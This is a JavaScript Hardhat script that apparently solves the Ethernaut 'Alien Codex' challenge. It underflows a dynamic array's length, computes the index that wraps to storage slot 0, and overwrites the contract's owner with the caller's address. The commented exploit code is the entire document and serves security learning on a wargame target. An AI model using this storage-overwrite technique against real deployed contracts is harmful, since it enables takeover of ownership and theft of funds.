const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xc973C703B74FE148Da8d01f164C70FFE6e644131'
const abi = [
    "function make_contact() public",
    "function record(bytes32 _content) public",
    "function retract() public",
    "function revise(uint i, bytes32 _content) public",
    "function contact() public view returns (bool)",
    "function codex() public view returns (bytes32)",
    "function owner() public view returns (address)"
]

async function hack(contract, signer) {
    // Unlock functions by making contact.
    const contactTx = await contract.make_contact()
    await contactTx.wait()
    console.log(`Contact made.`)

    // Since Solidity 0.5.0 allows underflows, we can reduce the codex length from 0 by 1 to get 2 ^ 256 - 1.
    const retractTx = await contract.retract()
    await retractTx.wait()
    console.log('Retracted codex length from 0 to 2 ^ 256 - 1.')

    // Dynamic arrays are stored in memory in slot keccak256(p), so the codex starts at keccak256(1).
    // 2 ^ 256 - starting slot gives us the size of the array needed to overflow into Slot 0.
    // Based on the inherited Ownable contract, the Slot 0 is the owner.
    const startingSlot = BigNumber.from(ethers.utils.solidityKeccak256(["uint"], [1]))
    const lengthToOverflow = BigNumber.from(2).pow(256).sub(startingSlot)
    console.log(`Array Slot for Overflow: ${lengthToOverflow.toString()}`)
    
    // Revise that slot of the codex to the bytes32 representation of your address.
    const paddedAddress = ethers.utils.hexZeroPad(signer.address, 32)
    const reviseTx = await contract.revise(lengthToOverflow, paddedAddress)
    await reviseTx.wait()

    // Check that the codex owner is now the signer.
    const codexOwner = await contract.owner()
    console.log(`Codex owner is ${codexOwner}`)
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})